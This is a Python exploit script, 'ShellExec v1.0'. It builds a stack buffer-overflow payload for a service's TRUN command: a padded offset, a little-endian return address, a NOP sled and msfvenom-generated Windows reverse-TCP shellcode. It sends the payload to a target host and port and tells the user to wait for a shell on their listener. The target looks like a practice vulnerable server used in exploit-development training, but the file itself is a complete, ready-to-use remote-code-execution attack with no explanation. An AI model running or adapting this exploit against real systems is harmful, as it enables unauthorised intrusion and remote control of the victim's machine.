#!/usr/bin/env python3
import sys
import socket
import argparse
import subprocess
from color_print import print_success, print_error, print_info

def hex_to_little_endian(hex_string): 
    if hex_string.startswith("0x"):
        hex_string = hex_string[2:]

    if not all (c in '0123456789abcdefABCDEF' for c in hex_string):
        raise ValueError("Invalid hex string")
    
    if len(hex_string) % 2 != 0:
        hex_string = "0" + hex_string

    bytes_pairs = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)]
    reversed_pairs = bytes_pairs[::-1]
    
    try:
        bytes_sequence = bytes()
        for pair in reversed_pairs:
            bytes_sequence += bytes.fromhex(pair)
        return bytes_sequence
    except ValueError as e:
        raise ValueError(f"Failed to convert hex to bytes {e}")
    
def format_bytes_as_hex(bytes_data):
    return ''.join(f'\\x{b:02x}' for b in bytes_data)

def generate_shellcode(LIP,LPORT):
    try:
        msfvenom_cmd = [
            "msfvenom",
            "-p", "windows/shell_reverse_tcp",
            f"LHOST={LIP}",
            f"LPORT={LPORT}",
            "EXITFUNC=thread",
            "-f", "raw",
            "-a", "x86",
            "-b", "\\x00"
        ]
        print_info("Generating shellcode with msfvenom: " + " ".join(msfvenom_cmd))
        result = subprocess.run(msfvenom_cmd, capture_output=True)

        if result.returncode != 0:
                error_message = result.stderr.decode("utf-8", errors="ignore")
                print_error(f"msfvenom error: {error_message}")
                sys.exit(1)
                
        shellcode_bytes = result.stdout
       
        
        if not shellcode_bytes:
            print_error("Failed to extract shellcode from msfvenom output.")
            sys.exit(1)
        print_success(f"Generated shellcode of length {len(shellcode_bytes)} bytes.")
        return shellcode_bytes

    except Exception as e:
            print_error(f"Error generating shellcode: {e}")
            sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="ShellExec v1.0")
    parser.add_argument("-ip", type=str, help="The target IP address.", required=True)
    parser.add_argument("-port", type=int, help="The target port.", required=True)
    parser.add_argument("-LIP", type=str, help="The local IP address for reverse shell.", required=True)
    parser.add_argument("-LPORT", type=int, help="The local port for reverse shell.", required=True)
    parser.add_argument("-offset", type=int, help="The offset value.", required=True)
    parser.add_argument("-expression", type=str, help="The Expression to follow. (e.g. 0x625011af /625011af)", required=True)
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    LIP = args.LIP
    LPORT = args.LPORT
    offset = args.offset
    expression = args.expression

    try:
        expression_value = hex_to_little_endian(expression)
        formatted_expression = format_bytes_as_hex(expression_value)
        print_success(f"Converted {expression} to little-endian: {formatted_expression}")
    except Exception as e:
        print_error(f"Error converting expression: {e}")
        sys.exit(1)

    shellcode = generate_shellcode(LIP,LPORT)

    try:
        nop_sled = b"\x90" * 32
        padding = b"A" * offset
        payload = b"TRUN /.:/" + padding + expression_value + nop_sled + shellcode
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(payload)
        print_success(f"Sent payload to {ip}:{port}.")
        try: 
            s.settimeout(5)
            s.recv(1024)
        except socket.timeout:
            print_info("No response from target, but payload sent.")
        finally:
            s.close()
        print_success("Exploit sent successfully. Check your listener for a shell.")    
    except socket.error as e:
        print_error(f"Socket error: {e}")
        sys.exit(1)
    except Exception as e:
        print_error(f"Error sending payload: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()